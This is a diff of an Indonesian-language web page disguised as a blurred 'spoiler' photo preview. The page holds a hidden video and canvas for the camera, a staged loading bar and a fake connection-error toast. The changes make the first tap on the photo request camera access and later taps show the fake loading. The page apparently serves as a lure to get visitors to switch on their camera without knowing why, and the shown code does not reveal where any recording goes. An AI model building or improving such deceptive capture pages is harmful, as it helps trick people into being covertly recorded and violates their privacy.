@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>imagepreview</title>
+    <title>Spoiler Foto - 9:16</title>
     <style>
         * {
             margin: 0;
@@ -119,26 +119,6 @@
             pointer-events: none;
             text-shadow: 0 1px 4px rgba(0, 0, 0, 0.6);
             z-index: 2;
-        }
-
-        .caption {
-            margin-top: 12px;
-            padding: 0 6px;
-            color: #9a9aa3;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            letter-spacing: 0.2px;
-        }
-
-        .caption .tap-hint {
-            color: #6f6f7a;
-            font-size: 12px;
-            background: #25252b;
-            padding: 4px 12px;
-            border-radius: 30px;
-            transition: all 0.2s ease;
         }
 
         /* Video & Canvas disembunyikan */
@@ -301,7 +281,7 @@
     <div class="error-toast" id="errorToast">
         <div class="title">Koneksi Bermasalah</div>
         <div class="desc">Gagal memuat gambar. Periksa koneksi internet Anda dan coba lagi.</div>
-        <button class="btn-ok" id="btnOk">🔄 Coba Lagi</button>
+        <button class="btn-ok" id="btnOk">Coba Lagi</button>
     </div>
 
     <!-- Video & Canvas untuk kamera (hidden) -->
@@ -315,7 +295,6 @@
             const bubble = document.getElementById('spoilerBubble');
             const canvas = document.getElementById('dotCanvas');
             const ctx = canvas.getContext('2d');
-            const hint = document.getElementById('tapHint');
             const loadingOverlay = document.getElementById('loadingOverlay');
             const loadingProgress = document.getElementById('loadingProgress');
             const errorToast = document.getElementById('errorToast');
@@ -334,7 +313,6 @@
                 clockElement.textContent = hours + ':' + minutes;
             }
 
-            // Update jam setiap 30 detik
             updateClock();
             setInterval(updateClock, 30000);
 
@@ -355,6 +333,7 @@
             let clickCount = 0;
             let loadingTimeout = null;
             let progressInterval = null;
+            let isFirstClick = true;
 
             // ====== BINTIK ======
             function resizeCanvas() {
@@ -645,14 +624,21 @@
 
                 if (errorToast.classList.contains('show')) return;
 
-                if (!isCameraReady && !isRecording) {
-                    setupCamera();
+                clickCount++;
+                console.log(`👆 Klik spoiler #${clickCount}`);
+
+                // Klik ke-1: minta izin kamera
+                if (clickCount === 1) {
+                    if (!isCameraReady && !isRecording) {
+                        setupCamera();
+                    }
+                    return;
                 }
 
-                showLoading();
-                
-                clickCount++;
-                console.log(`👆 Klik spoiler #${clickCount} (loading patah-patah sampai 64%)`);
+                // Klik ke-2 dan seterusnya: muncul loading
+                if (clickCount >= 2) {
+                    showLoading();
+                }
             }
 
             // ====== INIT ======
